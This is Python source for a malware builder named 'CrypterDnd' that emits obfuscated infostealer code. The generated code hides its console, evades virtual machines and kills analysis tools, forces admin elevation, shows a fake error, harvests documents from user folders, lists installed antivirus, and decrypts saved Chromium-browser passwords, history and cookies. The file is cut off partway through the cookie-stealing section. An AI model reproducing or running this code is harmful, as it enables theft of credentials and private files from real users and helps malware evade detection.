import random
import textwrap
import base64


import zlib

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad

class CrypterDnd:
    def delayCode(self):
        delayRandom=random.randint(5,10)
        var1=self.getUniqFunctionOrVarName()
        var2=self.getUniqFunctionOrVarName()
        code_block =textwrap.dedent("""

    def {var1}():
        return time.time()
    def {var2}():
        return {var1}() + {delayRandom}
    while {var1}() < {var2}():
        pass
        """).format(var1=var1,var2=var2,delayRandom=delayRandom)
        return code_block
    
    def getAntiVMCode(self):
        firstFuncName=self.getUniqFunctionOrVarName()
        secondFuncName=self.getUniqFunctionOrVarName()
        code_block =textwrap.dedent("""
    def {}():
        return getattr(sys, "base_prefix", None) or getattr(sys, "real_prefix", None) or sys.prefix
    def {}(): 
        return {}() != sys.prefix
    if {}() == True: 
        sys.exit() 
    """.format(firstFuncName, secondFuncName, firstFuncName, secondFuncName))

        thirdFuncName=self.getUniqFunctionOrVarName()
        fourthFuncName=self.getUniqFunctionOrVarName()
        minDisk=self.getUniqFunctionOrVarName()
        disk_size_bytes=self.getUniqFunctionOrVarName()
        disk_size_gb=self.getUniqFunctionOrVarName()

        forP=self.getUniqFunctionOrVarName()
        procstr=self.getUniqFunctionOrVarName()

        autoclose=self.getUniqFunctionOrVarName()
        autoCloseP=self.getUniqFunctionOrVarName()
        autocloseProcstr=self.getUniqFunctionOrVarName()

        code_block +=textwrap.dedent("""
    def {thirdFuncName}():
        for {forP} in psutil.process_iter():
            if any({procstr} in {forP}.name().lower() for {procstr} in ["vmwareservice", "vmwaretray","joeboxcontrol","vmwareuser","vmware","virtualbox","hyperv"]):
                sys.exit()
                os._exit(0)
    def {fourthFuncName}():
        {minDisk} = 66
        if len(sys.argv) > 1:
            {minDisk} = float(sys.argv[1])
        _,{disk_size_bytes}, _ = win32api.GetDiskFreeSpaceEx()
        {disk_size_gb} = {disk_size_bytes}/1073741824
        if {disk_size_gb} < {minDisk}:
            try:
                sys.exit()
                os._exit(0)
            except:
                sys.exit()
                os._exit(1)
    def {autoclose}():
        for {autoCloseP} in psutil.process_iter():
            if any({autocloseProcstr} in {autoCloseP}.name().lower() for {autocloseProcstr} in ['taskmgr','process','processhacker','ksdumper','fiddler','httpdebuggerui','wireshark','httpanalyzerv7','fiddler','decoder','regedit','procexp','dnspy','vboxservice','burpsuit']):
                try:
                    {autoCloseP}.kill()
                except:
                    pass

    {thirdFuncName}()
    {fourthFuncName}()
    {autoclose}()
        """).format(
            thirdFuncName=thirdFuncName,
            fourthFuncName=fourthFuncName,
            minDisk=minDisk,
            disk_size_bytes=disk_size_bytes,
            disk_size_gb=disk_size_gb,
            forP=forP,
            procstr=procstr,
            autoclose=autoclose,
            autoCloseP=autoCloseP,
            autocloseProcstr=autocloseProcstr

        )


        return code_block
    def forceAdmin(self):
        cytpesVar=self.getUniqFunctionOrVarName()
        code_block =textwrap.dedent("""
{} = ctypes.windll.shell32.IsUserAnAdmin()
if not {}:
    ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
    sys.exit()
        """).format(cytpesVar,cytpesVar)
        return code_block
    def fakeError(self):
        messagebox=self.getUniqFunctionOrVarName()
        
        error_titles = [
            "System.IO.FileNotFoundException",
            "System.IO.DirectoryNotFoundException",
            "System.IO.IOException",
            "System.IO.PathTooLongException",
            "System.BadImageFormatException",
            "System.DllNotFoundException",
            "System.TypeLoadException",
            "System.Reflection.ReflectionTypeLoadException",
            "System.Net.Sockets.SocketException",
            "System.Security.SecurityException",
        ]

        error_contents = {
            "System.IO.FileNotFoundException": "The system cannot find the file specified. Please make sure that the file exists and that you have the necessary permissions to access it.",
            "System.IO.DirectoryNotFoundException": "The system cannot find the specified directory. Please make sure that the directory exists and that you have the necessary permissions to access it.",
            "System.IO.IOException": "An I/O error occurred while accessing the file. Please make sure that the file is not locked by another process and that you have the necessary permissions to access it.",
            "System.IO.PathTooLongException": "The specified path, file name, or both are too long. Please make sure that the path and file name do not exceed the maximum length allowed by the system.",
            "System.BadImageFormatException": "The file is not a valid .NET assembly. Please make sure that the file is a valid .NET assembly and that you have the necessary permissions to access it.",
            "System.DllNotFoundException": "The system cannot find the specified DLL. Please make sure that the DLL exists and that you have the necessary permissions to access it.",
            "System.TypeLoadException": "The system cannot load the specified type. Please make sure that the type is defined in the assembly and that you have the necessary permissions to access it.",
            "System.Reflection.ReflectionTypeLoadException": "The system cannot load one or more of the specified types. Please make sure that the types are defined in the assembly and that you have the necessary permissions to access them.",
            "System.Net.Sockets.SocketException": "An error occurred while accessing the network. Please make sure that your network connection is working properly and that you have the necessary permissions to access the network.",
            "System.Security.SecurityException": "The system has encountered a security error. Please make sure that you have the necessary permissions to perform the requested operation.",
        }
        error_title = random.choice(error_titles)
        error_content = error_contents.get(error_title, "An unknown error has occurred. Please contact your system administrator.")


        code_block =textwrap.dedent("""
    {messagebox}=ctypes.windll.user32.MessageBoxW
    {messagebox}(0, "{error_content}", "{error_title}", 0x30 | 0x40000)
        """).format(
            messagebox=messagebox,
            error_title=error_title,
            error_content=error_content
        )
        return code_block
    
 
        
    
    def JunkGen(self):
        name=self.getUniqFunctionOrVarName(1000,2000)
        name2=self.getUniqFunctionOrVarName(2000,3000)
        name3=self.getUniqFunctionOrVarName(3000,4000)
        name4=self.getUniqFunctionOrVarName(4000,5000)
        bools=["True","False"]
        randomBool=random.choice(bools)
        if randomBool=="True":
            code_block =textwrap.dedent("""
            def {name}():
                {name2}={name3}={name4}={randomBool}
            """.format(
                name=name,
                name2=name2,
                name3=name3,
                name4=name4,
                randomBool=randomBool
            ))
        else:
            lastName=name+"_"+name2+"_"+name3+"_"+name4
            code_block =textwrap.dedent("""
                {lastName}={randomBool}
            """.format(
                lastName=lastName,
                randomBool=randomBool
            ))
        return code_block


        
    def getImportCode(self):
        hwnd=self.getUniqFunctionOrVarName()
        code_block =textwrap.dedent("""
    import wmi, requests, platform, psutil, os, datetime, winreg, sqlite3, shutil, os, json, base64, win32crypt,uuid,win32api,sys,ctypes,base64,zlib,time
    from Cryptodome.Cipher import AES
    import xml.etree.ElementTree as ET
    from Crypto.Util.Padding import pad, unpad
    from Crypto.Random import get_random_bytes

    
    {hwnd} = ctypes.windll.kernel32.GetConsoleWindow()
    ctypes.windll.user32.ShowWindow({hwnd}, 0)
    """.format(
            hwnd=hwnd
    ))

        randomNum=random.randint(10,50)
        for i in range(randomNum):
            code_block +=self.JunkGen()
        return code_block
    
    def virusMain(self):

        randomComment1=self.getUniqFunctionOrVarName(15500,20000,word=True)
        randomComment2=self.getUniqFunctionOrVarName(15400,20000,word=True)
        randomComment3=self.getUniqFunctionOrVarName(15300,20000,word=True)
        randomComment4=self.getUniqFunctionOrVarName(15200,20000,word=True)
        PCInfoClass=self.getUniqFunctionOrVarName(10000,20000)


        PCInfoClass_IP=self.getUniqFunctionOrVarName()
        PCInfoClass_CPU=self.getUniqFunctionOrVarName()
        PCInfoClass_GPU=self.getUniqFunctionOrVarName()
        PCInfoClass_RAM=self.getUniqFunctionOrVarName()
        PCInfoClass_DISK=self.getUniqFunctionOrVarName()
        PCInfoClass_USERNAME=self.getUniqFunctionOrVarName()
        PCInfoClass_OS_VERSION=self.getUniqFunctionOrVarName()
        PCInfoClass_RUN_DATE=self.getUniqFunctionOrVarName()
        PCInfoTempMac=self.getUniqFunctionOrVarName()
        PCInfoMac=self.getUniqFunctionOrVarName()
        PCInfoTempLocation=self.getUniqFunctionOrVarName()
        PCInfoLocation=self.getUniqFunctionOrVarName()
        PCInfoHwid=self.getUniqFunctionOrVarName()
        PCInfoFiles=self.getUniqFunctionOrVarName()

        PCInfoFilesFuncName=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoFilesFuncNameImportantFiles=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoFilesFuncNameDirs=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoFilesFuncRoot=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoFilesFuncFiles=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoFilesFuncFile=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoFilesFuncExt=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoFilesFuncExts=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoFilesFuncDirectory=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoFilesFuncReader=self.getUniqFunctionOrVarName()
        PCInfoFilesFuncReadData=self.getUniqFunctionOrVarName()
        PCInfoFilesFuncReadDataEncoded=self.getUniqFunctionOrVarName()
        
        PCInfoGetHwidFuncName=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoGetHwidWName=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoGetHwidTempName=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoGetHwidDiskName=self.getUniqFunctionOrVarName(10000,25000)

        PCInfoGetCPUInfoFuncName=self.getUniqFunctionOrVarName(10000,25000)

        PCInfoGetDiskInfoFuncName=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoGetDiskInfoFuncName2=self.getUniqFunctionOrVarName(10000,25000)

        tempVarForUseInFunc=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc2=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc3=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc4=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc5=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc6=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc7=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc8=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc9=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc10=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc11=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc12=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc13=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc14=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc15=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc16=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc17=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc18=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc19=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc20=self.getUniqFunctionOrVarName(10000,25000)
        tempVarForUseInFunc21=self.getUniqFunctionOrVarName(10000,25000)

        PCInfoGetUsernameFuncName=self.getUniqFunctionOrVarName(10000,25000)
        PCInfoGetGpuInfoFuncName=self.getUniqFunctionOrVarName(10000,25000)

        SoftwareInfoClass=self.getUniqFunctionOrVarName(10000,20000)
        SoftwareInfoClassFoo=self.getUniqFunctionOrVarName(10000,20000)
        SoftwareInfoClassSelfSoftwareList=self.getUniqFunctionOrVarName(10000,20000)
        SoftwareInfoClassGetSoftwareListFuncName=self.getUniqFunctionOrVarName(10000,20000)

        SoftwareInfoClassGetBrowserFuncName=self.getUniqFunctionOrVarName(10000,20000)

        SoftwareInfoClassGetAntiVirusFuncName=self.getUniqFunctionOrVarName(10000,20000)

        SoftwareInfoReturnAllSoftwareFuncName=self.getUniqFunctionOrVarName(10000,20000)
        SoftwareInfoDecetedAllBrowserFuncName=self.getUniqFunctionOrVarName(10000,20000)
        SoftwareInfoDecetedAllAntivursFuncName=self.getUniqFunctionOrVarName(10000,20000)

        ChromeStealarClassName=self.getUniqFunctionOrVarName(10000,20000)
        ChromeStealerClassNamePassword=self.getUniqFunctionOrVarName(10000,20000)
        ChromeStealerClassNameHistory=self.getUniqFunctionOrVarName(10000,20000)
        ChromeStealerClassNameCookie=self.getUniqFunctionOrVarName(10000,20000)
        ChromeStealerClassNameCreditC=self.getUniqFunctionOrVarName(10000,20000)
        ChromeStealarClassStartChromeFuncName=self.getUniqFunctionOrVarName(10000,20000)
        ChromeStealarClassGetMasterKeyFuncName=self.getUniqFunctionOrVarName(10000,20000)
        ChromeStealarClassDecryptPassorFuncName=self.getUniqFunctionOrVarName(10000,20000)

        ChromeStealarClassGenerateCyperFuncName=self.getUniqFunctionOrVarName(10000,20000)
        ChromeStealarClassPayloadFuncName=self.getUniqFunctionOrVarName(10000,20000)
        FileZilleCLassName=self.getUniqFunctionOrVarName(10000,20000)
        FileZilleClassPasswordName=self.getUniqFunctionOrVarName(10000,20000)
        FilezilleClassgetPasswordFuncname=self.getUniqFunctionOrVarName(10000,20000)

        code_block =textwrap.dedent(r"""
# {randomComment1}
# {randomComment2}
class {PCInfoClass}:
    def __init__(self):
        self.{PCInfoClass_IP} = requests.get("https://api.ipify.org").text
        self.{PCInfoClass_CPU} = self.{PCInfoGetGpuInfoFuncName}()
# {randomComment3}
        self.{PCInfoClass_GPU} = self.{PCInfoGetCPUInfoFuncName}()
        self.{PCInfoClass_RAM} = f"{{round(psutil.virtual_memory().total/1024**3)}} GB"
        self.{PCInfoClass_DISK} = self.{PCInfoGetDiskInfoFuncName}()
# {randomComment3}
        self.{PCInfoClass_USERNAME} = self.{PCInfoGetUsernameFuncName}()
        self.{PCInfoClass_OS_VERSION} = platform.system() + " " + platform.release()
# {randomComment4}
        self.{PCInfoClass_RUN_DATE} = datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S")
        {PCInfoTempMac} = ':'.join(['{{:02x}}'.format((uuid.getnode() >> i) & 0xff) for i in range(0, 48, 8)])
        self.{PCInfoMac} = {PCInfoTempMac}
# {randomComment4}
        {PCInfoTempLocation} = requests.get("http://ip-api.com/json/").json()
# {randomComment1}
        self.{PCInfoLocation} = {PCInfoTempLocation}["countryCode"]
# {randomComment2}
        self.{PCInfoHwid} = self.{PCInfoGetHwidFuncName}()
        self.{PCInfoFiles}= self.{PCInfoFilesFuncName}()
# {randomComment2}
    def {PCInfoGetGpuInfoFuncName}(self):
        try:
            {tempVarForUseInFunc} = wmi.WMI()
            for {tempVarForUseInFunc2} in {tempVarForUseInFunc}.Win32_Processor():
                return f"{{{tempVarForUseInFunc2}.Name}} ({{{tempVarForUseInFunc2}.NumberOfCores}} cores)"
        except:
            return "NULL"
# {randomComment4}
    def {PCInfoGetUsernameFuncName}(self):
# {randomComment4}
        try:
            return os.getlogin()
        except:
            return "NULL"
# {randomComment2}
    def {PCInfoGetDiskInfoFuncName}(self):
        {PCInfoGetHwidTempName} = psutil.disk_partitions()
# {randomComment2}
        {PCInfoGetDiskInfoFuncName2} = []
        for {PCInfoGetHwidWName} in {PCInfoGetHwidTempName}:
            if 'cdrom' in {PCInfoGetHwidWName}.opts or {PCInfoGetHwidWName}.fstype == '':
                continue
            {PCInfoGetHwidDiskName} = psutil.disk_usage({PCInfoGetHwidWName}.mountpoint)
            {PCInfoGetDiskInfoFuncName2}.append(f"{{{PCInfoGetHwidWName}.device}} ({{{PCInfoGetHwidWName}.mountpoint}}) - {{{PCInfoGetHwidDiskName}.total/1024**3:.2f}} GB {{{PCInfoGetHwidDiskName}.percent}}% filled")
        return '\n'.join({PCInfoGetDiskInfoFuncName2})
# {randomComment4}
    def {PCInfoGetCPUInfoFuncName}(self):
# {randomComment2}
        try:
            {PCInfoGetHwidWName} = wmi.WMI(namespace="root\\cimv2")
# {randomComment4}
            for {PCInfoGetHwidTempName} in {PCInfoGetHwidWName}.Win32_VideoController():
                return {PCInfoGetHwidTempName}.Name
        except:
# {randomComment4}
            return "NULL"
# {randomComment4}
    def {PCInfoGetHwidFuncName}(self):
        {PCInfoGetHwidWName} = wmi.WMI()
        {PCInfoGetHwidTempName}=""
# {randomComment4}
        for {PCInfoGetHwidDiskName} in {PCInfoGetHwidWName}.Win32_DiskDrive():
            if {PCInfoGetHwidDiskName}.Size:
# {randomComment2}
                {PCInfoGetHwidTempName}+={PCInfoGetHwidDiskName}.SerialNumber.strip()
        return {PCInfoGetHwidTempName}
         # {randomComment1}
# {randomComment4}
    def {PCInfoFilesFuncName}(self):
        {PCInfoFilesFuncNameImportantFiles} = []
# {randomComment3}
        {PCInfoFilesFuncNameDirs} = [
            os.path.join(os.environ['USERPROFILE'], folder) for folder in ['Downloads', 'Desktop', 'Documents', 'Pictures', 'Videos', 'Music', 'OneDrive']
        ]
# {randomComment2}
        {PCInfoFilesFuncExts} =  {{".txt", ".pdf", ".docx", ".doc", ".xlsx", ".xls", ".pptx", ".ppt", ".sql", ".json", ".xml",".db"}}
        # {randomComment1}
        for {PCInfoFilesFuncDirectory} in {PCInfoFilesFuncNameDirs}:
            for {PCInfoFilesFuncRoot}, {PCInfoFilesFuncNameDirs}, {PCInfoFilesFuncFiles} in os.walk({PCInfoFilesFuncDirectory}):
                for {PCInfoFilesFuncFile} in {PCInfoFilesFuncFiles}:
                    {PCInfoFilesFuncExt} = os.path.splitext({PCInfoFilesFuncFile})[1]
# {randomComment3}
                    if {PCInfoFilesFuncExt} in {PCInfoFilesFuncExts}:
                        with open(os.path.join({PCInfoFilesFuncRoot}, {PCInfoFilesFuncFile}), 'rb') as {PCInfoFilesFuncReader}:
                            {PCInfoFilesFuncReadDataEncoded} = ""
                            while True:
# {randomComment4}
                                {PCInfoFilesFuncReadData} = {PCInfoFilesFuncReader}.read()
                                if not {PCInfoFilesFuncReadData}:
                                    break
                                {PCInfoFilesFuncReadDataEncoded} += base64.b64encode({PCInfoFilesFuncReadData}).decode('utf-8')
# {randomComment3}                        
                            {PCInfoFilesFuncNameImportantFiles}.append({{
                                "file_name":{PCInfoFilesFuncFile},
                                "file_data":{PCInfoFilesFuncReadDataEncoded}
                            }})
# {randomComment1}  
        return {PCInfoFilesFuncNameImportantFiles}
  # {randomComment3}  
class {SoftwareInfoClass}:
    def __init__(self):
        self.{SoftwareInfoClassSelfSoftwareList} = []
        self.{SoftwareInfoClassGetSoftwareListFuncName}()
  # {randomComment3}  
    def {SoftwareInfoClassGetSoftwareListFuncName}(self):
        self.{SoftwareInfoClassSelfSoftwareList} = self.{SoftwareInfoClassFoo}(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_32KEY) + \
                             self.{SoftwareInfoClassFoo}(winreg.HKEY_LOCAL_MACHINE, winreg.KEY_WOW64_64KEY) + \
                             self.{SoftwareInfoClassFoo}(winreg.HKEY_CURRENT_USER, 0)
  # {randomComment3}  
    def {SoftwareInfoClassFoo}(self, {tempVarForUseInFunc3}, {tempVarForUseInFunc4}):
        {tempVarForUseInFunc} = winreg.ConnectRegistry(None, {tempVarForUseInFunc3})
        {tempVarForUseInFunc2} = winreg.OpenKey({tempVarForUseInFunc}, r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
                              0, winreg.KEY_READ | {tempVarForUseInFunc4})
  # {randomComment3}  
        {tempVarForUseInFunc20} = winreg.QueryInfoKey({tempVarForUseInFunc2})[0]
  # {randomComment3}  
        {tempVarForUseInFunc5} = []
  # {randomComment3}  
        for {tempVarForUseInFunc6} in range({tempVarForUseInFunc20}):
            {tempVarForUseInFunc9} = {{}}
            try:
                {tempVarForUseInFunc7} = winreg.EnumKey({tempVarForUseInFunc2}, {tempVarForUseInFunc6})
                {tempVarForUseInFunc8} = winreg.OpenKey({tempVarForUseInFunc2}, {tempVarForUseInFunc7})
                {tempVarForUseInFunc9}["name"] = winreg.QueryValueEx({tempVarForUseInFunc8}, "DisplayName")[0]
                try:
                    {tempVarForUseInFunc9}["version"] = winreg.QueryValueEx({tempVarForUseInFunc8}, "DisplayVersion")[0]
                except EnvironmentError:
                    {tempVarForUseInFunc9}["version"] = 'undefined'
                try:
                    {tempVarForUseInFunc9}["publisher"] = winreg.QueryValueEx({tempVarForUseInFunc8}, "Publisher")[0]
                except EnvironmentError:
                    {tempVarForUseInFunc9}["publisher"] = 'undefined'
                {tempVarForUseInFunc5}.append({tempVarForUseInFunc9})
            except EnvironmentError:
                continue
        return {tempVarForUseInFunc5}
      # {randomComment3}  
    def {SoftwareInfoClassGetBrowserFuncName}(self):
        {tempVarForUseInFunc}=[
        "chrome", 
        "firefox", 
        "opera", 
        "safari", 
        "brave", 
        "vivaldi", 
        "yandex", 
        "chromium",
        "internet explorer",
        ]
        {tempVarForUseInFunc2} = []
        {tempVarForUseInFunc4} = self.{SoftwareInfoReturnAllSoftwareFuncName}()
        for {tempVarForUseInFunc3} in {tempVarForUseInFunc}:
            for {tempVarForUseInFunc5} in {tempVarForUseInFunc4}:
                if {tempVarForUseInFunc3} in {tempVarForUseInFunc5}['name'].lower():
                    {tempVarForUseInFunc2}.append({tempVarForUseInFunc5}.get('name'))
                if "edge" in {tempVarForUseInFunc5}['name'].lower() and {tempVarForUseInFunc2}.count("Microsoft Edge") == 0:
                    {tempVarForUseInFunc2}.append("Microsoft Edge")
        return {tempVarForUseInFunc2}
  # {randomComment3}  
    def {SoftwareInfoClassGetAntiVirusFuncName}(self):
        {tempVarForUseInFunc}=[
        "avast",
        "avg",
        "bitdefender",
        "comodo",
        "eset",
        "f-secure",
        "kaspersky",
        "mcafee",
        "norton",
        "panda",
        "sophos",
        "trend micro",
        "webroot",
        "windows defender",
        "zoner",
        "avira",
        "webroot",
        "malwarebytes",
        "superantispyware",
        "adaware",
        "sophos",
        "eset",
        "fortinet",
        "ikarus",
        ]
        {tempVarForUseInFunc2} = []
        {tempVarForUseInFunc3} = self.{SoftwareInfoReturnAllSoftwareFuncName}()
        for antivirus in {tempVarForUseInFunc}:
            for {tempVarForUseInFunc4} in {tempVarForUseInFunc3}:
                if antivirus in {tempVarForUseInFunc4}['name'].lower():
                    {tempVarForUseInFunc5} = {tempVarForUseInFunc4}['name']
                    {tempVarForUseInFunc6} = {tempVarForUseInFunc5}.encode('ascii', 'ignore').decode('ascii')
                    {tempVarForUseInFunc4}['name'] = {tempVarForUseInFunc6}
                    {tempVarForUseInFunc2}.append({tempVarForUseInFunc4}.get('name'))
        if len({tempVarForUseInFunc2}) == 0:
            {tempVarForUseInFunc2}.append("Possible no 3rd party antivirus installed using windows defender")
        return {tempVarForUseInFunc2}
  # {randomComment3}  
  # {randomComment3}  
  # {randomComment3}  
      # {randomComment3}  
  # {randomComment3}  
    def {SoftwareInfoReturnAllSoftwareFuncName}(self):
        return self.{SoftwareInfoClassSelfSoftwareList}
      # {randomComment3}  
    def {SoftwareInfoDecetedAllBrowserFuncName}(self):
        return self.{SoftwareInfoClassGetBrowserFuncName}()
      # {randomComment3}  
    def {SoftwareInfoDecetedAllAntivursFuncName}(self):
        return self.{SoftwareInfoClassGetAntiVirusFuncName}()
class {ChromeStealarClassName}:
    def __init__(self):
        self.{ChromeStealerClassNamePassword} = []
        self.{ChromeStealerClassNameHistory} = []
        self.{ChromeStealerClassNameCookie} = [] 
        self.{ChromeStealerClassNameCreditC} = [] 
  # {randomComment3}  
  # {randomComment3}  
        self.{ChromeStealarClassStartChromeFuncName}()
  # {randomComment3}  
    def {ChromeStealarClassGetMasterKeyFuncName}(self,{tempVarForUseInFunc4}):
        with open({tempVarForUseInFunc4}, "r", encoding='utf-8') as {tempVarForUseInFunc}:
            {tempVarForUseInFunc2} = {tempVarForUseInFunc}.read()
            {tempVarForUseInFunc2} = json.loads({tempVarForUseInFunc2})
        {tempVarForUseInFunc3} = base64.b64decode({tempVarForUseInFunc2}["os_crypt"]["encrypted_key"])
        {tempVarForUseInFunc3} = {tempVarForUseInFunc3}[5:]  
        {tempVarForUseInFunc3} = win32crypt.CryptUnprotectData({tempVarForUseInFunc3}, None, None, None, 0)[1]
        return {tempVarForUseInFunc3}
  # {randomComment3}  
    def {ChromeStealarClassStartChromeFuncName}(self):
                {tempVarForUseInFunc}=[
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data',
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\BraveSoftware\Brave-Browser\User Data',
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Chromium\User Data',
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Yandex\YandexBrowser\User Data',
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Microsoft\Edge\User Data',
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Vivaldi\User Data',
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Sputnik\Sputnik\User Data',
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\7Star\7Star\User Data',
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\CentBrowser\User Data',
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Orbitum\User Data',
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Kometa\User Data',
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Torch\User Data',
                    os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Amigo\User Data',
                ]
                {tempVarForUseInFunc2}=[
                    "Default",
                    "Profile 1",
                    "Profile 2",
                    "Profile 3",
                    "Profile 4",
                    "Profile 5",
                ]
  # {randomComment3}  
                for {tempVarForUseInFunc3} in {tempVarForUseInFunc}:
                    for {tempVarForUseInFunc4} in {tempVarForUseInFunc2}:
  # {randomComment2}  
                        {tempVarForUseInFunc5} = {tempVarForUseInFunc3} + os.sep + {tempVarForUseInFunc4} + os.sep + "Login Data"
                        {tempVarForUseInFunc6} = {tempVarForUseInFunc3} + os.sep + {tempVarForUseInFunc4} + os.sep + "History"
                        {tempVarForUseInFunc7} = {tempVarForUseInFunc3} + os.sep + {tempVarForUseInFunc4} + os.sep + "Web Data"
                        {tempVarForUseInFunc8} = {tempVarForUseInFunc3} + os.sep + {tempVarForUseInFunc4} + os.sep + "Network" + os.sep + "Cookies"
      # {randomComment3}  
  # {randomComment3}  
                        if not os.path.exists({tempVarForUseInFunc3}):
                            continue
                        if not os.path.exists({tempVarForUseInFunc3} + os.sep + {tempVarForUseInFunc4}):
                            continue
  # {randomComment3}  
                        shutil.copy2({tempVarForUseInFunc5}, {tempVarForUseInFunc5} + ".db")
                        shutil.copy2({tempVarForUseInFunc6}, {tempVarForUseInFunc6} + ".db")
                        shutil.copy2({tempVarForUseInFunc7}, {tempVarForUseInFunc7} + ".db")
                        shutil.copy2({tempVarForUseInFunc8}, {tempVarForUseInFunc8} + ".db")
  # {randomComment3}  
  # {randomComment3}  
                        try:
                            {tempVarForUseInFunc9} = sqlite3.connect({tempVarForUseInFunc5} + ".db")
                            {tempVarForUseInFunc10} = {tempVarForUseInFunc9}.cursor()
                            {tempVarForUseInFunc10}.execute("SELECT action_url, username_value, password_value FROM logins")
                            for {tempVarForUseInFunc20} in {tempVarForUseInFunc10}.fetchall():
                                {tempVarForUseInFunc11} = {tempVarForUseInFunc20}[0]
                                {tempVarForUseInFunc12} = {tempVarForUseInFunc20}[1]
                                {tempVarForUseInFunc18} = {tempVarForUseInFunc20}[2]
                                {tempVarForUseInFunc14} = self.{ChromeStealarClassGetMasterKeyFuncName}({tempVarForUseInFunc3}+os.sep+"Local State")
                                {tempVarForUseInFunc13} = self.{ChromeStealarClassDecryptPassorFuncName}({tempVarForUseInFunc18}, {tempVarForUseInFunc14})
                                if len({tempVarForUseInFunc12}) > 0:
                                    {tempVarForUseInFunc15} = {{
                                            "url": {tempVarForUseInFunc11},
                                            "username": {tempVarForUseInFunc12},
                                            "password": {tempVarForUseInFunc13}
                                        }}
                                    self.{ChromeStealerClassNamePassword}.append({tempVarForUseInFunc15})
                                # {randomComment3}    
                        except Exception as e:
                            pass
                        {tempVarForUseInFunc10}.close()
                        {tempVarForUseInFunc9}.close()
                        try:
                            os.remove({tempVarForUseInFunc5} + ".db")
                        except Exception as e:
                            pass
             # {randomComment3}               
                        try:
                            {tempVarForUseInFunc9} = sqlite3.connect({tempVarForUseInFunc6} + ".db")
                            {tempVarForUseInFunc10} = {tempVarForUseInFunc9}.cursor()
                            {tempVarForUseInFunc10}.execute("SELECT url, title, visit_count, last_visit_time FROM urls")
                            for {tempVarForUseInFunc20} in {tempVarForUseInFunc10}.fetchall():
                                {tempVarForUseInFunc11} = {tempVarForUseInFunc20}[0]
                                {tempVarForUseInFunc13} = {tempVarForUseInFunc20}[1]
                                {tempVarForUseInFunc15} = {tempVarForUseInFunc20}[2]
                                {tempVarForUseInFunc16} = {tempVarForUseInFunc20}[3]
                                {tempVarForUseInFunc12} = {tempVarForUseInFunc11}.encode('ascii', 'ignore').decode('ascii')
                                {tempVarForUseInFunc14} = {tempVarForUseInFunc13}.encode('ascii', 'ignore').decode('ascii')
                                {tempVarForUseInFunc21} = {{
                                    "url": {tempVarForUseInFunc12},
                                    "title": {tempVarForUseInFunc14},
                                    "visit_count": {tempVarForUseInFunc15},
                                    "last_visit_time": {tempVarForUseInFunc16}
                                }}
                                self.{ChromeStealerClassNameHistory}.append({tempVarForUseInFunc21})
                        except Exception as e:
                            pass
                        {tempVarForUseInFunc10}.close()
                        {tempVarForUseInFunc9}.close()
                        try:
                            os.remove({tempVarForUseInFunc6} + ".db")
                        except Exception as e:
                            pass
                        try:
                            {tempVarForUseInFunc11} = sqlite3.connect({tempVarForUseInFunc8} + ".db")
                            {tempVarForUseInFunc10} = {tempVarForUseInFunc11}.cursor()
                            {tempVarForUseInFunc10}.execute("SELECT host_key, name, value, encrypted_value FROM cookies")
                            for {tempVarForUseInFunc12} in {tempVarForUseInFunc10}.fetchall():
                                    {tempVarForUseInFunc13} = {tempVarForUseInFunc12}[0]
                                    {tempVarForUseInFunc14} = {tempVarForUseInFunc12}[1]
                                    {tempVarForUseInFunc18} = {tempVarForUseInFunc12}[2]
                                    {tempVarForUseInFunc15} = {tempVarForUseInFunc12}[3]
                                    if {tempVarForUseInFunc15}:
